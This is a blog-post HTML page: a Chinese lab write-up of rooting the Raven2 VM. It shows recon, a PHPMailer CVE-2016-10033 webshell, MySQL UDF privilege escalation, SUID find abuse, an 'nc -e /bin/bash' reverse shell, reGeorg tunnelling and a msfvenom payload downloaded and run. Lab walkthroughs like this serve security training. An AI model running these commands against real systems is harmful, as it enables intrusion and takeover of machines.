@@ -1,0 +1,167 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="提权"><meta name="keywords" content=""><meta name="author" content="wickt42"><meta name="copyright" content="wickt42"><title>提权 | Wickt42's Tech Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  hexoVersion: '7.3.0'
+} </script><meta name="generator" content="Hexo 7.3.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">Windows提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL"><span class="toc-number">2.1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.1.</span> <span class="toc-text">udf提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">内核提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86"><span class="toc-number">2.3.</span> <span class="toc-text">烂土豆</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">脏牛提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Raven2"><span class="toc-number">4.</span> <span class="toc-text">Raven2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8B%E6%8E%A7%E5%88%B6%E6%9D%83"><span class="toc-number">4.2.</span> <span class="toc-text">拿下控制权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">4.3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.4.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">4.4.1.</span> <span class="toc-text">正向代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">4.4.2.</span> <span class="toc-text">反向代理</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729165900674.jpg"></div><div class="author-info__name text-center">wickt42</div><div class="author-info__description text-center">Information Security</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/wickt42/wickt42.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">47</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">13</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">34</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://github.com/">github</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody">hexo-theme-melody</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729164955479.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Wickt42's Tech Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/slides">Slides</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">提权</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2025-09-19</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>如何提权？–&gt;对linux，对windows下载systeminfo文件，mysql提权</p>
+<h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>udf &#x3D; ‘user defined function’，用户自定义函数。通过添加新函数对MySQL的功能进行扩充</p>
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>缓冲区溢出</p>
+<h2 id="烂土豆"><a href="#烂土豆" class="headerlink" title="烂土豆"></a>烂土豆</h2><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h2><h1 id="Raven2"><a href="#Raven2" class="headerlink" title="Raven2"></a>Raven2</h1><p>获取root权限</p>
+<p>要求使用反弹shell结合udf提权，整个过程尽量在攻击者主机操作</p>
+<p>内网部署一台web主机，实现正向代理直接访问内网主机，使用hydra爆破内网主机弱口令再使用3389登录上去，搭建网卡的操作可以直接在raven2虚拟机上操作</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描 raven 的IP，初步确定为 192.168.142.148</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.142.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925091903918.png" alt="image-20250919141746849"></p>
+<p>访问192.168.142.148确定为目标主机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925091912483.png" alt="image-20250919141948442"></p>
+<p>扫描开放的端口，开放端口为22、80、111</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.142.148</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925091918383.png" alt="image-20250919142145797"></p>
+<p>111 端口开放了 rpcbind 服务，查看枚举所有注册的 RPC 服务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcinfo -p 192.168.142.148</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925091925069.png" alt="image-20250919144138970"></p>
+<p>进行目录扫描，扫描到了 wordpress 目录和 vendor 目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.142.148</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925091930884.png" alt="image-20250919145424954"></p>
+<p>扫描wordpress存在的用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925091936879.png" alt="image-20250919150244446"></p>
+<p>访问链接查看是否存在敏感信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925091942364.png" alt="image-20250919145851299"></p>
+<p>查看VERSION文件发现phpmailer的版本为5.2.16</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925091948453.png" alt="image-20250919152048611"></p>
+<h2 id="拿下控制权"><a href="#拿下控制权" class="headerlink" title="拿下控制权"></a>拿下控制权</h2><p>正好有个漏洞 CVE-2016-10033 ，影响 5.2.18 之前版本的phpmailer</p>
+<p>接着去<a target="_blank" rel="noopener" href="https://www.exploit-db.com/%E7%BD%91%E7%AB%99%E6%90%9C%E7%B4%A2%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%9A%84exp">https://www.exploit-db.com/网站搜索这个漏洞的exp</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925091953903.png" alt="image-20250919152802996"></p>
+<p>接着去kali主机查看是否有exp利用文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit 40974</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092002036.png" alt="image-20250919152840877"></p>
+<p>发现有这个文件，先复制到桌面方便使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/php/webapps/40974.py ~/Desktop/40974.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092007479.png" alt="image-20250919153031510"></p>
+<p>接下来修改exp中的内容为需要攻击的对象</p>
+<ul>
+<li><p><strong>target</strong> 字段是设置攻击目标，通常是一个包含联系表单的页面</p>
+</li>
+<li><p><strong>backdoor</strong> 后门路径攻，击成功后在目标服务器上创建的Webshell 文件的访问路径</p>
+</li>
+<li><p><strong>payload</strong> 字段中修改反弹 shell 的 ip 和端口号</p>
+</li>
+<li><p><strong>fields</strong> 字段 email 的访问后门文件的路径</p>
+</li>
+</ul>
+<p>apache 2 的默认路径为&#x2F;var&#x2F;www&#x2F;html</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092013809.png" alt="image-20250919155209426"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092019403.png" alt="image-20250919154411379"></p>
+<p>修改完成后启动脚本，成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092024798.png" alt="image-20250919155611515"></p>
+<p>访问houmen文件测试连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url = 192.168.142.148/houmen.php</span><br><span class="line">bash = nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092030155.png" alt="image-20250919160035125"></p>
+<p>获得一个交互式shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092037690.png" alt="image-20250919160254255"></p>
+<p>在 &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress 路径下查看wordpress的配置文件 wp-config.php ，发现数据库的账号密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092042882.png" alt="image-20250919160538483"></p>
+<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>登录 mysql 的 root 账户，开始尝试使用 udf 提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pR@v3nSecurity</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092048541.png" alt="image-20250919161000403"></p>
+<p>首先查看数据的写权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br><span class="line"># secure_file_priv 的 value 值为空则说明可在任意地进行写文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092054799.png" alt="image-20250919161537854"></p>
+<p>查看MySQL的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select version();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092101220.png" alt="image-20250919162119708"></p>
+<p>数据库版本高于5.1，所以文件需要放在lib\plugin目录下才能生效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092106195.png" alt="image-20250919162330209"></p>
+<p>搜索MySQL进行udf提权的exp，靶场系统是linux，并且MySQL版本为5.5，这里选择 1518.c 文件作为exp</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit mysql udf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092111387.png" alt="image-20250919163127104"></p>
+<p>复制</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/1518.c ~/Desktop/1518.c</span><br></pre></td></tr></table></figure>
+
+<p>使用 gcc 进行编译</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -g -c 1518.c</span><br><span class="line"></span><br><span class="line">gcc -g -shared -o 1518.so 1518.o -lc</span><br><span class="line"></span><br><span class="line"><span class="comment"># -g 生成调试信息</span></span><br><span class="line"><span class="comment"># -c 进行编译</span></span><br><span class="line"><span class="comment"># -shared 创建一个动态链接库文件，输入文件可以是源文件、汇编文件或者目标文件</span></span><br><span class="line"><span class="comment"># -o 指定输出文件名称</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来需要将刚刚生成的文件上传到靶机的 &#x2F;tmp 目录下，Web用户没有对 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; 路径的写权限，需要先上传到 &#x2F;tmp 或其他具有写权限的目录下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 9090		<span class="comment"># kali主机启动一个http服务</span></span><br><span class="line"></span><br><span class="line">wget http://192.168.142.132:9090/1518.so		<span class="comment"># 靶机下载exp文件</span></span><br></pre></td></tr></table></figure>
+
+<p>在mysql数据库下创建表 udf</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table udf(line blob);</span><br></pre></td></tr></table></figure>
+
+<p>将刚刚下载的1518.so文件插入到数据库中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into udf values(load_file(&#x27;/tmp/1518.so&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092117106.png" alt="image-20250919171015637"></p>
+<p>接着将数据导出到 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; 路径下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from udf into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line"># outfile多行导出，dumpfile一行导出。outfile会有特殊的转换，而dumpfile是原数据导出</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092121923.png" alt="image-20250919171006995"></p>
+<p>创建自定义函数 do_system，函数类型为integer，别名（soname）文件名字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>调用刚刚创建的do_system函数来给find命令所有者的suid权限，使其可以执行root命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092126845.png" alt="image-20250919172308956"></p>
+<p>使用 find 执行 SUID 提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> udf</span><br><span class="line"></span><br><span class="line">find udf -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092131266.png" alt="image-20250919173142137"></p>
+<p>成功变成root用户</p>
+<p>方法二反弹shell实现提权</p>
+<p>在之前的反弹shell中数据库输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select do_system(&#x27;nc -nv 192.168.142.132 6677 -e /bin/bash&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>kali主机进行监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6677</span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>			<span class="comment"># 获得一个交互式shell</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092135921.png" alt="image-20250921130657865"></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>进行内网渗透，这里先修改root的密码为1234.com（好像没什么用）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092145169.png" alt="image-20250921130836529"></p>
+<p>启动raven2的第二张网卡（模拟内网渗透环境）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;auto eth1&quot;</span> &gt;&gt; /etc/network/interfaces			<span class="comment"># 设置网卡 eth1 为自启动</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;iface eth1 inet dhcp&quot;</span> &gt;&gt; /etc/network/interfaces			<span class="comment"># 让网卡 eth1 使用 DHCP 协议自动获取 IP 地址</span></span><br><span class="line">ifconfig eth1 up			<span class="comment"># 立即手工启用网卡</span></span><br><span class="line">systemctl restart networking</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入完后第二张网卡就启动了</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>上传 reGeorg 的 tunnel.nosocket.php 文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 9090		<span class="comment"># kali主机启动一个http服务</span></span><br><span class="line"></span><br><span class="line">wget http://192.168.142.132:9090/tunnel.nosocket.php		<span class="comment"># 靶机下载文件</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 kali 主机 python 启动 socks 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -p 1080 -u http://192.168.142.148/tunnel.nosocket.php</span><br></pre></td></tr></table></figure>
+
+<p>进行远程连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains xfreerdp /u:administrator /p:1234@qbz /v:192.168.247.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092150905.png" alt="image-20250921144842845"></p>
+<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>尝试使用 msfvenom 生成反向TCP载荷进行反向代理</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.142.132 LPORT=1234 -f elf -o shell.elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># -p linux/x64/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="comment"># limux/x64/: 指定目标平台和架构为64 位的 Linux 系统。</span></span><br><span class="line"><span class="comment"># meterpreter/: 指定使用 Meterpreter 作为有效载荷。</span></span><br><span class="line"><span class="comment"># reverse_tcp: 指定连接方式为反向 TCP（由被控端主动连接攻击机）。</span></span><br><span class="line"><span class="comment"># -f elf: 指定输出格式为 ELF (Executable and Linkable Format)，这是 Linux 系统标准的可执行文件格式。</span></span><br><span class="line"><span class="comment"># -o shell.elf: 指定输出文件名为 shell.elf。</span></span><br></pre></td></tr></table></figure>
+
+<p>将生成的文件上传到服务器中</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 9090		<span class="comment"># kali主机启动一个http服务</span></span><br><span class="line"></span><br><span class="line">wget http://192.168.142.132:9090/shell.elf		<span class="comment"># 靶机下载exp文件</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x shell.elf			<span class="comment"># 添加执行权限</span></span><br><span class="line"></span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>kali主机，使用msfconsole监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.142.132 </span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250925092158798.png" alt="image-20250921140035945"></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">wickt42</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/09/19/提权/">http://example.com/2025/09/19/提权/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2025/09/23/%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"><i class="fa fa-chevron-left">  </i><span>简单汇编指令</span></a></div><div class="next-post pull-right"><a href="/2025/09/17/%E4%BB%A3%E7%90%86/"><span>代理</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729164955479.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2025 By wickt42</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>
